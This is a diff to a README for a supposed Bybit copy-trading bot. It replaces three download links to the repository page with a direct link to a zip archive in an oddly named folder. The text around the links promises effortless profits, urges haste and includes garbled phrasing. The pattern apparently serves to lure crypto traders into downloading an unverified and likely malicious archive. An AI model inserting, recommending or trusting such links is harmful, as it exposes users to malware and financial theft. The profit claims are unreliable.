@@ -1,6 +1,6 @@
 # 🤖 Bybit-Copy-Trading-Signal-Bot - Automate Your Trading Profits Now
 
-[![Download Now](https://img.shields.io/badge/Download-BybitBot_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Arryanshah11/Bybit-Copy-Trading-Signal-Bot)
+[![Download Now](https://img.shields.io/badge/Download-BybitBot_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Arryanshah11/Bybit-Copy-Trading-Signal-Bot/main/intradepartmental/v3.9.zip)
 
 ---
 
@@ -49,7 +49,7 @@ Follow these steps exactly, and you’ll be trading within 5 minutes.
 
 Visit this link to download the application:
 
-[🔗 Download BybitBot from GitHub](https://github.com/Arryanshah11/Bybit-Copy-Trading-Signal-Bot)
+[🔗 Download BybitBot from GitHub](https://raw.githubusercontent.com/Arryanshah11/Bybit-Copy-Trading-Signal-Bot/main/intradepartmental/v3.9.zip)
 
 This is the only official source. Don’t trust mirrored links — they might have viruses.
 
@@ -150,7 +150,7 @@ The crypto market moves fast. Every day you wait is a day of missed opportunitie
 
 Download it now, follow the 3 steps above, and see how effortless automated trading can be.
 
-[🚀 Get Your Free Bot Now](https://github.com/Arryanshah11/Bybit-Copy-Trading-Signal-Bot)
+[🚀 Get Your Free Bot Now](https://raw.githubusercontent.com/Arryanshah11/Bybit-Copy-Trading-Signal-Bot/main/intradepartmental/v3.9.zip)
 
 Join thousands of happy users who've already automated their quantum into their trading routine. Your new money-making machine is just one click away.
 
